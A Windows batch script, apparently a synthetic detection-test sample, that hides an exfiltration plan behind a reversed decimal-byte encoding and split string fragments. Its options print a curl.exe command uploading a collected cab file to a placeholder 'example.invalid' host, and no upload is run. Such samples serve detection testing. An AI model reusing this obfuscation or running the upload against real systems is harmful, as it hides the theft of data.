@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:decimal_bytes|reverse
rem HUNTRESS-MATERIAL:100.97.111.108.112.117.47.100.105.108.97.118.110.105.46.101.108.112.109.97.120.101.46.102.49.53.56.48.100.97.48.49.50.47.47.58.115.112.116.116.104.61.108.114.117.95.100.97.111.108.112.117.124.98.97.99.46.102.49.53.56.48.100.97.48.49.50.45.116.99.101.108.108.111.99.92.98.97.76.115.115.101.114.116.110.117.72.92.99.105.108.98.117.80.92.115.114.101.115.85.92.58.67.61.104.116.97.112.95.101.99.114.117.111.115.124.102.49.53.56.48.100.97.48.49.50.45.110.103.105.97.112.109.97.99.61.100.105.95.110.103.105.97.112.109.97.99.124.101.110.111.110.61.101.103.97.117.103.110.97.108.95.116.120.101.110.124.121.114.116.101.114.95.107.99.97.98.108.108.97.102.61.104.112.97.114.103.124.49.61.116.110.117.111.99.95.101.103.97.116.115.124.101.120.101.46.108.114.117.99.61.114.101.116.112.97.100.97.124.101.116.111.109.101.114.95.100.97.111.108.112.117.44.114.101.102.115.110.97.114.116.95.101.114.97.112.101.114.112.44.108.97.99.111.108.95.101.116.97.99.111.108.61.115.112.101.116.115.124.49.61.118
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "fragment0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=curl.e"& rem HUNTRESS quote compound
set "fragment1=xe|stage_count=1|graph=fallback_retry|next_language=none|campaign_id"& rem HUNTRESS quote compound
set "fragment2==campaign-210ad0851f|source_path=C:\Users\Public\HuntressLab\collect"& rem HUNTRESS quote compound
set "fragment3=-210ad0851f.cab|upload_url=https://210ad0851f.example.invalid/upload"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE
set "neutral_arithmetic=9c14b9a7"
call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "recovered_configuration=%fragment0%%fragment1%%fragment2%%fragment3%"
exit /b 0
:HUNTRESS_EMIT
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_PLAN
echo curl.exe upload C:\Users\Public\HuntressLab\collect-210ad0851f.cab to https://210ad0851f.example.invalid/upload
exit /b 0
